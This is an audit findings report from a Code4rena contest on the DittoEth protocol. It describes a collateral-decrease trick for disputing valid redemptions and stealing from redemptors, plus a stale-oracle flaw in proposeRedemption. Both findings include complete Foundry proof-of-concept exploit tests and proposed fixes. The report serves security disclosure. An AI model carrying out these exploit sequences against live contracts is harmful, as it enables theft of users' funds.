# [HIGH-01] Decrease collateral can be used to dispute redemptions and steal from redemptors

## Submission Link
https://github.com/code-423n4/2024-03-dittoeth-findings/issues/219

# Lines of code
https://github.com/code-423n4/2024-03-dittoeth/blob/91faf46078bb6fe8ce9f55bcb717e5d2d302d22e/contracts/facets/ShortRecordFacet.sol#L81 https://github.com/code-423n4/2024-03-dittoeth/blob/91faf46078bb6fe8ce9f55bcb717e5d2d302d22e/contracts/facets/RedemptionFacet.sol#L224

# Vulnerability details
## Impact
[`decreaseCollateral()`](https://github.com/code-423n4/2024-03-dittoeth/blob/91faf46078bb6fe8ce9f55bcb717e5d2d302d22e/contracts/facets/ShortRecordFacet.sol#L81) can reduce the CR of a position down to the asset.initialCR (in the deploy script this value is set to CR 1.7). The current redemptionCR is set to 2.

Shorter can dispute with 100% consistency all redemptions of Short Record positions that are between initialCR and redemptionCR (CR 1.7 - 2.0) by using decreaseCollateral to set his SR to CR 1.7.

In addition, if the oracle price changes within 0-3 hours the shorter is going to be able to dispute redemptions of Short Records that have CR down to 1.35 by using his Short Record that is CR 1.7.

Despite that users correctly created redemption proposals, shorters have the power to dispute them incorrectly and steal up to 33% of their erc assets.

## Proof of Concept
`test_decreaseCollateral_poc_1` shows how shorter disputes all redemptions towards his large position and all other redemptions that are between CR 1.7-2.

`test_decreaseCollateral_poc_2_belowInitialCR` shows how shorter can dispute positions with low CR such as 1.37-1.41 with his position that is CR 1.7 when there is a new oracle asset price.

To run the tests use `forge test --match-contract Exploit -vv`.

Create a new Exploit.t.sol file inside the test folder and paste the following:

```solidity
// SPDX-License-Identifier: GPL-3.0-only
pragma solidity 0.8.21;

import {stdError} from "forge-std/StdError.sol";
import {U256, U88, U80} from "contracts/libraries/PRBMathHelper.sol";
import {C} from "contracts/libraries/Constants.sol";
import {STypes, MTypes, O} from "contracts/libraries/DataTypes.sol";

import {OBFixture} from "test/utils/OBFixture.sol";
import {console} from "contracts/libraries/console.sol";

contract Exploit is OBFixture {
    event LOG(string message);

    using U256 for uint256;
    using U88 for uint88;
    using U80 for uint80;

    function setUp() public override {
        super.setUp();

        // Set initialCR to 170 (CR 1.7X) as it is in DeployHelper.sol
        vm.prank(owner);
        diamond.setInitialCR(asset, 170);
        initialCR = diamond.getAssetStruct(asset).initialCR;
    }

    function createCustomLimitShort(address shorter, uint80 price, uint88 ercAmount, uint16 cr) private {
        uint256 convertedCR = (uint256(cr) * 1 ether) / C.TWO_DECIMAL_PLACES;
        depositEth(shorter, price.mulU88(ercAmount).mulU88(convertedCR));
        uint16[] memory shortHintArray = setShortHintArray();
        MTypes.OrderHint[] memory orderHintArray = diamond.getHintArray(asset, price, O.LimitShort, 1);
        vm.prank(shorter);
        diamond.createLimitShort(asset, price, ercAmount, orderHintArray, shortHintArray, cr);
    }

    function proposeRedemption(address account, uint88 redemptionAmount, address shorter, uint8 shortId) private {
        depositEth(account, MAX_REDEMPTION_FEE);
        MTypes.ProposalInput[] memory proposalInputs = new MTypes.ProposalInput[](1);
        proposalInputs[0] = MTypes.ProposalInput({shorter: shorter, shortId: shortId, shortOrderId: 100}); // shortOrderId doesn't matter here
        depositUsd(account, redemptionAmount);

        vm.prank(account);
        diamond.proposeRedemption(asset, proposalInputs, redemptionAmount, MAX_REDEMPTION_FEE);
    }

    // This shows how a redemptioner can act correctly but still be disputed by a malicious actor
    function test_decreaseCollateral_poc_1() public {
        address exploiter = makeAddr("exploiter");
        address buyer = makeAddr("buyer");
        address randomSeller = makeAddr("randomSeller");
        address randomRedemptioner = makeAddr("randomRedemptioner");
        address randomRedemptioner2 = makeAddr("randomRedemptioner2");
        address randomRedemptioner3 = makeAddr("randomRedemptioner3");
        address randomRedemptioner4 = makeAddr("randomRedemptioner4");

        // 1. create 5 different Short Record positions
        // # Exploiter's Short Record id: 2 - exploiter large position
        {
            createCustomLimitShort(exploiter, DEFAULT_PRICE, DEFAULT_AMOUNT * 10, 400); // CR 4X
            fundLimitBidOpt(DEFAULT_PRICE, DEFAULT_AMOUNT * 10, buyer);
        }

        // # Exploiter's Short Record id: 3
        {
            createCustomLimitShort(exploiter, DEFAULT_PRICE, DEFAULT_AMOUNT, 1000); // CR 10X
            fundLimitBidOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, buyer);
        }

        // # Random seller's Short Record id: 2
        {
            createCustomLimitShort(randomSeller, DEFAULT_PRICE, DEFAULT_AMOUNT, 410); // CR 4.1X
            fundLimitBidOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, buyer);
        }

        // # Random seller's Short Record id: 3
        {
            createCustomLimitShort(randomSeller, DEFAULT_PRICE, DEFAULT_AMOUNT, 415); // CR 4.15X
            fundLimitBidOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, buyer);
        }

        // # Random seller's Short Record id: 4
        {
            createCustomLimitShort(randomSeller, DEFAULT_PRICE, DEFAULT_AMOUNT, 425); // CR 4.25X
            fundLimitBidOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, buyer);
        }

        // 2. Time passes and price of asset drops and lowers CR to below redemptionCR levels
        _setETH(1400 ether);
        skip(3600);

        // log current CR of all positions
        {
            STypes.ShortRecord memory shortRecord1 = diamond.getShortRecord(asset, exploiter, 2);
            STypes.ShortRecord memory shortRecord2 = diamond.getShortRecord(asset, exploiter, 3);
            uint256 crOfExploiterLargePosition = diamond.getCollateralRatio(asset, shortRecord1);
            uint256 crOfExploiterSmallPosition = diamond.getCollateralRatio(asset, shortRecord2);
            console.log("CR of exploiters large position", crOfExploiterLargePosition); // CR 1.75X
            console.log("CR of exploiters small position", crOfExploiterSmallPosition); // CR 3.85X
        }

        {
            STypes.ShortRecord memory shortRecord1 = diamond.getShortRecord(asset, randomSeller, 2);
            STypes.ShortRecord memory shortRecord2 = diamond.getShortRecord(asset, randomSeller, 3);
            STypes.ShortRecord memory shortRecord3 = diamond.getShortRecord(asset, randomSeller, 4);
            uint256 crOfSR1 = diamond.getCollateralRatio(asset, shortRecord1);
            uint256 crOfSR2 = diamond.getCollateralRatio(asset, shortRecord2);
            uint256 crOfSR3 = diamond.getCollateralRatio(asset, shortRecord3);
            console.log("CR of Random seller position 1", crOfSR1); // CR 1.78X
            console.log("CR of Random seller position 2", crOfSR2); // CR 1.80X
            console.log("CR of Random seller position 3", crOfSR3); // CR 1.83X
        }

        // 3. Redemption proposal is placed at the SR with lowest CR (exploiters large position) + all other postions below CR 2
        proposeRedemption(randomRedemptioner, DEFAULT_AMOUNT * 10, exploiter, 2);

        proposeRedemption(randomRedemptioner2, DEFAULT_AMOUNT, randomSeller, 2);
        proposeRedemption(randomRedemptioner3, DEFAULT_AMOUNT, randomSeller, 3);
        proposeRedemption(randomRedemptioner4, DEFAULT_AMOUNT, randomSeller, 4);

        // 4. Shorter decreases CR of his small Short Record position
        vm.prank(exploiter);
        diamond.decreaseCollateral(asset, 3, 7.6 ether);

        {
            STypes.ShortRecord memory shortRecord2 = diamond.getShortRecord(asset, exploiter, 3);
            uint256 crOfExploiterSmallPosition = diamond.getCollateralRatio(asset, shortRecord2);
            console.log("CR of exploiters small position", crOfExploiterSmallPosition); // CR 1.72X
        }

        // 4. Disputes his bigger position + all other positions (optional)
        STypes.AssetUser memory balanceBeforeDisputes = diamond.getAssetUserStruct(asset, exploiter);

        vm.prank(exploiter);
        diamond.disputeRedemption(asset, randomRedemptioner, 0, exploiter, 3);
        vm.prank(exploiter);
        diamond.disputeRedemption(asset, randomRedemptioner2, 0, exploiter, 3);
        vm.prank(exploiter);
        diamond.disputeRedemption(asset, randomRedemptioner3, 0, exploiter, 3);
        vm.prank(exploiter);
        diamond.disputeRedemption(asset, randomRedemptioner4, 0, exploiter, 3);

        // 5. Increases CR of his small positon to healthy CR levels
        vm.prank(exploiter);
        diamond.increaseCollateral(asset, 3, 7.6 ether);

        STypes.AssetUser memory balanceAfterDisputes = diamond.getAssetUserStruct(asset, exploiter);

        // gets all erc penalties of all disputed redemptions
        console.log("balanceBeforeDisputes.ercEscrowed", balanceBeforeDisputes.ercEscrowed);
        console.log("balanceAfterDisputes.ercEscrowed", balanceAfterDisputes.ercEscrowed);
    }

    // Showing that is is possible to achieve disputes with SRs that are below initialCR (CR 1.7).
    function test_decreaseCollateral_poc_2_belowInitialCR() public {
        address exploiter = makeAddr("exploiter");
        address buyer = makeAddr("buyer");
        address randomSeller = makeAddr("randomSeller");
        address randomRedemptioner = makeAddr("randomRedemptioner");
        address randomRedemptioner2 = makeAddr("randomRedemptioner2");
        address randomRedemptioner3 = makeAddr("randomRedemptioner3");

        // 1. create 4 different Short Record positions

        // # Exploiter's Short Record id: 2
        {
            createCustomLimitShort(exploiter, DEFAULT_PRICE, DEFAULT_AMOUNT, 1000); // CR 10X
            fundLimitBidOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, buyer);
        }

        {
            // # Random seller's Short Record id: 2
            createCustomLimitShort(randomSeller, DEFAULT_PRICE, DEFAULT_AMOUNT, 410); // CR 4.1X
            fundLimitBidOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, buyer);

            // # Random seller's Short Record id: 3
            createCustomLimitShort(randomSeller, DEFAULT_PRICE, DEFAULT_AMOUNT, 415); // CR 4.15X
            fundLimitBidOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, buyer);

            // # Random seller's Short Record id: 4
            createCustomLimitShort(randomSeller, DEFAULT_PRICE, DEFAULT_AMOUNT, 425); // CR 4.25X
            fundLimitBidOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, buyer);
        }

        // 2. Time passes and price of asset drops and lowers CR to below redemptionCR levels
        _setETH(1080 ether);
        skip(10000);

        // log current CR of all positions
        {
            STypes.ShortRecord memory shortRecord = diamond.getShortRecord(asset, exploiter, 2);
            uint256 crOfExploiter = diamond.getCollateralRatio(asset, shortRecord);
            console.log("CR of exploiter position", crOfExploiter); // CR 2.97X
        }

        {
            STypes.ShortRecord memory shortRecord1 = diamond.getShortRecord(asset, randomSeller, 2);
            STypes.ShortRecord memory shortRecord2 = diamond.getShortRecord(asset, randomSeller, 3);
            STypes.ShortRecord memory shortRecord3 = diamond.getShortRecord(asset, randomSeller, 4);
            uint256 crOfSR1 = diamond.getCollateralRatio(asset, shortRecord1);
            uint256 crOfSR2 = diamond.getCollateralRatio(asset, shortRecord2);
            uint256 crOfSR3 = diamond.getCollateralRatio(asset, shortRecord3);
            console.log("CR of Random seller position 1", crOfSR1); // CR 1.37X
            console.log("CR of Random seller position 2", crOfSR2); // CR 1.39X
            console.log("CR of Random seller position 3", crOfSR3); // CR 1.41X
        }

        // 3. Redemption proposal is placed at the SR with lowest CR (exploiters large position) + all other postions below CR 2
        proposeRedemption(randomRedemptioner, DEFAULT_AMOUNT, randomSeller, 2);
        proposeRedemption(randomRedemptioner2, DEFAULT_AMOUNT, randomSeller, 3);
        proposeRedemption(randomRedemptioner3, DEFAULT_AMOUNT, randomSeller, 4);

        // Price of asset changes in short period of time
        _setETH(2000 ether);
        skip(3600);

        // 4. Shorter decreases CR of his Short Record position
        vm.prank(exploiter);
        diamond.decreaseCollateral(asset, 2, 9.5 ether);

        {
            STypes.ShortRecord memory shortRecord2 = diamond.getShortRecord(asset, exploiter, 2);
            uint256 crOfExploiterSmallPosition = diamond.getCollateralRatio(asset, shortRecord2);
            console.log("CR of exploiters position after price change", crOfExploiterSmallPosition); // CR 1.7X
        }

        // 4. Disputes his bigger position + all other positions (optional)
        STypes.AssetUser memory balanceBeforeDisputes = diamond.getAssetUserStruct(asset, exploiter);

        vm.prank(exploiter);
        diamond.disputeRedemption(asset, randomRedemptioner, 0, exploiter, 2); // disputes CR 1.37 with CR 1.7 position
        vm.prank(exploiter);
        diamond.disputeRedemption(asset, randomRedemptioner2, 0, exploiter, 2); // disputes CR 1.39 with CR 1.7 position
        vm.prank(exploiter);
        diamond.disputeRedemption(asset, randomRedemptioner3, 0, exploiter, 2); // disputes CR 1.41 with CR 1.7 position

        // 5. Increases CR of his small positon to healthy CR levels
        vm.prank(exploiter);
        diamond.increaseCollateral(asset, 2, 9.5 ether);

        STypes.AssetUser memory balanceAfterDisputes = diamond.getAssetUserStruct(asset, exploiter);

        // gets all erc penalties of all disputed redemptions
        console.log("balanceBeforeDisputes.ercEscrowed", balanceBeforeDisputes.ercEscrowed);
        console.log("balanceAfterDisputes.ercEscrowed", balanceAfterDisputes.ercEscrowed);
    }
}
```

## Tools Used
Manual Review

## Recommended Mitigation Steps
In [`decreaseCollateral()`](https://github.com/code-423n4/2024-03-dittoeth/blob/91faf46078bb6fe8ce9f55bcb717e5d2d302d22e/contracts/facets/ShortRecordFacet.sol#L81) ShortRecord.updatedAt property must be updated to the current timestamp and make the necessary changes to the distribution of yield accordingly. `InitialCR` must always be more than redemptionCR.

## Assessed type
Other

# [MEDIUM-01] proposeRedemption() uses old oracle price

## Submission Link
https://github.com/code-423n4/2024-03-dittoeth-findings/issues/230

# Lines of code
https://github.com/code-423n4/2024-03-dittoeth/blob/91faf46078bb6fe8ce9f55bcb717e5d2d302d22e/contracts/facets/RedemptionFacet.sol#L75

# Vulnerability details
## Impact
[`proposeRedemption()`](https://github.com/code-423n4/2024-03-dittoeth/blob/91faf46078bb6fe8ce9f55bcb717e5d2d302d22e/contracts/facets/RedemptionFacet.sol#L75) does not update asset price when called. If the protocol functions that update the price are not called for some time the real asset price can change but during the proposal of redemption, the protocol will calculate the CR according to the old saved price.

In such conditions, users are able to make redemptions to Short Records with healthy CRs (that are above redemptionCR)

## Proof of Concept
Run the test with `forge test --mt test_oldOraclePrice -vv`. Paste the following on the bottom of the BidOrders.t.sol file for example:

```solidity
function proposeRedemption(address account, uint88 redemptionAmount, address shorter, uint8 shortId) private {
        depositEth(account, MAX_REDEMPTION_FEE);
        MTypes.ProposalInput[] memory proposalInputs = new MTypes.ProposalInput[](1);
        proposalInputs[0] = MTypes.ProposalInput({shorter: shorter, shortId: shortId, shortOrderId: 100}); // shortOrderId doesn't matter here
        depositUsd(account, redemptionAmount);

        vm.prank(account);
        diamond.proposeRedemption(asset, proposalInputs, redemptionAmount, MAX_REDEMPTION_FEE);
    }

    function test_oldOraclePrice() public {
        address seller = makeAddr("seller");
        address buyer = makeAddr("buyer");
        address randomRedemptioner = makeAddr("randomRedemptioner");

        // 1. make Short Record
        {
            fundLimitShortOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, seller);
            fundLimitBidOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, buyer);
        }

        {
            STypes.ShortRecord memory shortRecord = diamond.getShortRecord(asset, seller, 2);
            uint256 cr = diamond.getCollateralRatio(asset, shortRecord);
            console.log("Short Record CR after match", cr); // CR 6X
        }

        // 2. Time passes, price drops and protocol updates its price through any user action and CR becomes 1.90
        skip(10000);
        _setETH(1080 ether);

        {
            STypes.ShortRecord memory shortRecord = diamond.getShortRecord(asset, seller, 2);
            uint256 cr = diamond.getCollateralRatio(asset, shortRecord);
            console.log("Short Record CR after match", cr); // CR 1.62X
        }

        // 3. Time passes, no redemptions are made and the price goes back up
        skip(1600);
        _setETHChainlinkOnly(1500 ether);

        // # Toggle this - this will update the oracle price and save it in the protocol.
        // {
        // fundLimitBidOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, buyer);
        // }

        // 4. CR is 2.25 on actual oracle price but redemption can be made against this position because the saved price makes the position with CR 1.62
        proposeRedemption(randomRedemptioner, DEFAULT_AMOUNT, seller, 2);
    }
```

You can toggle the indicated part in the test to see, that when the protocol gets the real asset price, the redemption proposal reverts.

## Tools Used
Manual Review

## Recommended Mitigation Steps
Use the real asset price instead of the saved one inside [`proposeRedemption()`](https://github.com/code-423n4/2024-03-dittoeth/blob/91faf46078bb6fe8ce9f55bcb717e5d2d302d22e/contracts/facets/RedemptionFacet.sol#L75)

## Assessed type
Oracle

